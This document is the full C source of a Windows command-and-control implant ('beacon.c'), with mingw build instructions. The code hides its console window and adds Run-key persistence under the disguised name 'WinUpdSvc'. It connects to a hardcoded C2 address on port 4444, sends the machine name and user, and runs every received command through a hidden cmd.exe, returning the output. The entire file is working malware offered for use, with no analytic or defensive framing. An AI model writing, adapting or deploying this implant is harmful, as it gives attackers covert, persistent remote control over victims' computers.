/*
 * beacon.c — Windows C2 Implant (raw text protocol, no framing)
 * Build:  x86_64-w64-mingw32-gcc -o beacon.exe beacon.c -lws2_32 -static -s -O2
 */

#define _WIN32_WINNT 0x0600
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST     "192.168.0.120"
#define C2_PORT     4444
#define BUF_SIZE    65536
#define ID_LEN      48

static char g_id[ID_LEN];
static char g_host[256];
static char g_user[128];
static char g_os[256];
static int  g_connected = 0;

static void gen_id(void) {
    DWORD vol = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &vol, NULL, NULL, NULL, 0);
    srand(GetTickCount() ^ vol ^ (DWORD)time(NULL));
    snprintf(g_id, ID_LEN, "WIN-%08x%04x", vol, rand() & 0xFFFF);
}

static void get_info(void) {
    DWORD sz = sizeof(g_host);
    GetComputerNameA(g_host, &sz);
    sz = sizeof(g_user);
    GetUserNameA(g_user, &sz);
    snprintf(g_os, sizeof(g_os), "Windows");
}

static void exec(const char *cmd, char *out, int max) {
    HANDLE rp, wp;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    char buf[4096];
    int total = 0;
    out[0] = '\0';

    if (!cmd || !*cmd) cmd = "whoami";

    if (!CreatePipe(&rp, &wp, &sa, 0)) {
        snprintf(out, (size_t)max, "[!] Pipe err %lu", GetLastError());
        return;
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wp;
    si.hStdError  = wp;
    si.wShowWindow = SW_HIDE;

    char *cl = malloc(strlen(cmd) + 16);
    if (!cl) { CloseHandle(rp); CloseHandle(wp); return; }
    snprintf(cl, strlen(cmd) + 16, "cmd.exe /c %s", cmd);

    BOOL ok = CreateProcessA(NULL, cl, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    free(cl);
    CloseHandle(wp);

    if (!ok) {
        snprintf(out, (size_t)max, "[!] Exec err %lu", GetLastError());
        CloseHandle(rp);
        return;
    }

    DWORD n;
    while (ReadFile(rp, buf, sizeof(buf) - 1, &n, NULL) && n > 0) {
        buf[n] = 0;
        int sp = max - total - 1;
        if (sp > 0) {
            int cp = (int)n < sp ? (int)n : sp;
            memcpy(out + total, buf, (size_t)cp);
            total += cp;
            out[total] = '\0';
        }
    }

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(rp);

    if (!*out) snprintf(out, (size_t)max, "[*] OK");
}

static void persist(void) {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, sizeof(path))) return;
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "WinUpdSvc", 0, REG_SZ,
                       (BYTE*)path, (DWORD)(strlen(path) + 1));
        RegCloseKey(hk);
    }
}

static void unpersist(void) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, "WinUpdSvc");
        RegCloseKey(hk);
    }
}

static void send_all(SOCKET s, const char *data, int len) {
    int t = 0, r;
    while (t < len) {
        r = send(s, data + t, len - t, 0);
        if (r <= 0) return;
        t += r;
    }
}

static int read_line(SOCKET s, char *buf, int max) {
    int t = 0;
    char c;
    while (t < max - 1) {
        int r = recv(s, &c, 1, 0);
        if (r <= 0) return -1;
        if (c == '\n') break;
        buf[t++] = c;
    }
    buf[t] = '\0';
    return t;
}

static void beacon_loop(void) {
    while (1) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) { Sleep(10000); continue; }

        struct hostent *h = gethostbyname(C2_HOST);
        if (!h) { closesocket(s); Sleep(10000); continue; }

        struct sockaddr_in a;
        a.sin_family = AF_INET;
        a.sin_port   = htons((u_short)C2_PORT);
        memcpy(&a.sin_addr, h->h_addr, (size_t)h->h_length);

        int to = 15000;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&to, sizeof(to));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&to, sizeof(to));

        if (connect(s, (struct sockaddr*)&a, sizeof(a)) < 0) {
            closesocket(s);
            Sleep(10000);
            continue;
        }

        g_connected = 1;

        /* Send initial beacon with ID info */
        char intro[BUF_SIZE];
        snprintf(intro, sizeof(intro), "[BEACON] %s | %s | %s | %s\n",
                 g_id, g_host, g_user, g_os);
        send_all(s, intro, (int)strlen(intro));

        char line[BUF_SIZE];
        while (1) {
            int n = read_line(s, line, sizeof(line));
            if (n < 0) break;

            if (strcmp(line, "PING") == 0) {
                /* Just keepalive, do nothing */
                continue;
            }

            if (strcmp(line, "EXIT") == 0 || strcmp(line, "exit") == 0) {
                break;
            }

            if (strcmp(line, "KILL") == 0 || strcmp(line, "kill") == 0) {
                unpersist();
                closesocket(s);
                ExitProcess(0);
            }

            if (strcmp(line, "PERSIST") == 0 || strcmp(line, "persist") == 0) {
                persist();
                char msg[] = "[*] Persistence added\n";
                send_all(s, msg, (int)strlen(msg));
                continue;
            }

            if (strcmp(line, "UNPERSIST") == 0 || strcmp(line, "unpersist") == 0) {
                unpersist();
                char msg[] = "[*] Persistence removed\n";
                send_all(s, msg, (int)strlen(msg));
                continue;
            }

            /* Execute whatever command was sent */
            char result[BUF_SIZE];
            exec(line, result, sizeof(result));

            /* Send result back */
            char sendbuf[BUF_SIZE + 64];
            snprintf(sendbuf, sizeof(sendbuf), "%s\n", result);
            send_all(s, sendbuf, (int)strlen(sendbuf));
        }

        closesocket(s);
        g_connected = 0;
        Sleep(10000); /* Reconnect delay */
    }
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS) {
    (void)hI; (void)hP; (void)lpC; (void)nS;
    HWND con = GetConsoleWindow();
    if (con) ShowWindow(con, SW_HIDE);
    srand(GetTickCount() ^ (DWORD)time(NULL));

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    gen_id();
    get_info();
    persist();
    beacon_loop();
    WSACleanup();
    return 0;
}
